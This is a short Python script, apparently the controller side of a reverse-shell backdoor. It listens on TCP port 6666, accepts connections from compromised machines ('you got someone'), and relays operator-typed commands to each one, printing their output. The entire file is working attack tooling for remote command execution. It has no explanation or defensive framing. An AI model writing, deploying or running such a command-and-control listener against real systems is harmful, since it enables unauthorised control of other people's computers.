import socket
import threading

IP = "0.0.0.0"
PORT = 6666

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((IP, PORT))
server.listen(5)

clients = []

def handle_client(client_socket):
    while True:
        try:
            command = input("Command> ")
            client_socket.send(command.encode())

            if command == "exit":
                client_socket.close()
                break
            else:
                response = client_socket.recv(999999)
                print(response.decode())
        except:
            client_socket.close()
            break

def accept_connections():
    while True:
        client_socket, addr = server.accept()
        clients.append(client_socket)
        print(f"[+] you got someone and he is {addr[0]}:{addr[1]}")
        threading.Thread(target=handle_client, args=(client_socket,)).start()

accept_connections()
